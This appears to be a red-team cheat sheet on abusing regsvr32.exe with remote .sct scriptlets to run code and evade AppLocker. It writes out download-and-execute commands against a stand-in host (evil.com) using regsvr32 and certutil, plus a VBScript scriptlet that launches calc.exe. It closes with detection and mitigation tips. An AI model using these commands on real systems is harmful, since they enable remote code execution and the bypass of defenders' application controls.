# 🧬 Regsvr32 + Scriptlets (.sct) - Living Off the Land

**regsvr32.exe** is a signed Microsoft binary used to register COM objects. Attackers exploit it to execute remote `.sct` scriptlets — **filelessly**, **without touching disk**, and **bypassing most defenses**.

> ⚠️ Extremely stealthy. This technique is used by nation-state APTs and advanced malware droppers. Use only in authorized red team labs.

---

## 🛠️ What It Does
- Registers DLLs or scriptlets for COM execution
- Can fetch `.sct` (scriptlet) files over HTTP/S
- Executes without writing to disk
- Bypasses AppLocker, WDAC, and some AVs

---

## 💣 Common LotL regsvr32 Techniques

### 1. Execute Remote .SCT Scriptlet
```cmd
regsvr32 /s /n /u /i:http://evil.com/malicious.sct scrobj.dll
```
✅ Fetches and executes remote code — *zero files written locally*

---

### 2. Sample `.sct` Payload (VBScript Backdoor)
**malicious.sct**:
```xml
<scriptlet>
<registration
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}"
    description="Example">
<script language="VBScript">
    CreateObject("Wscript.Shell").Run "calc.exe", 0, False
</script>
</registration>
</scriptlet>
```
✅ Full payload lives in memory — great for phishing, droppers, or C2 beacons

---

### 3. Pair with Certutil to Drop SCT First
```cmd
certutil -urlcache -split -f http://evil.com/malicious.sct malicious.sct
regsvr32 /s /n /u /i:malicious.sct scrobj.dll
```
✅ Hybrid method if staging from disk is required

---

### 4. Bypass AppLocker (If `regsvr32` is allowed)
✅ `regsvr32` is signed and often whitelisted — using it with `scrobj.dll` and `.sct` bypasses most defenses

---

## 🕵️‍♂️ Detection Tips
| Indicator | Method |
|-----------|--------|
| Use of `regsvr32` with `scrobj.dll` | Alert on command-line args `/i:http://...` and `scrobj.dll` as module |
| `.sct` file from untrusted domain | Monitor traffic for `.sct` downloads over HTTP/S |
| Rare regsvr32 use | It's uncommon in modern environments — investigate all usage

---

## 🔐 Mitigation Strategies
- Block `regsvr32.exe` or `scrobj.dll` if unused in org
- Monitor for `regsvr32` launching child processes or reaching out to internet
- Disable scriptlet execution via registry or GPO if not required
- Use network inspection to detect `.sct` downloads

---

> 🧠 `regsvr32` with scriptlets is pure stealth — fileless, trusted binary, minimal forensic trace. Common in phishing payloads, macro chains, and APT malware like FIN7, Astaroth, and more.
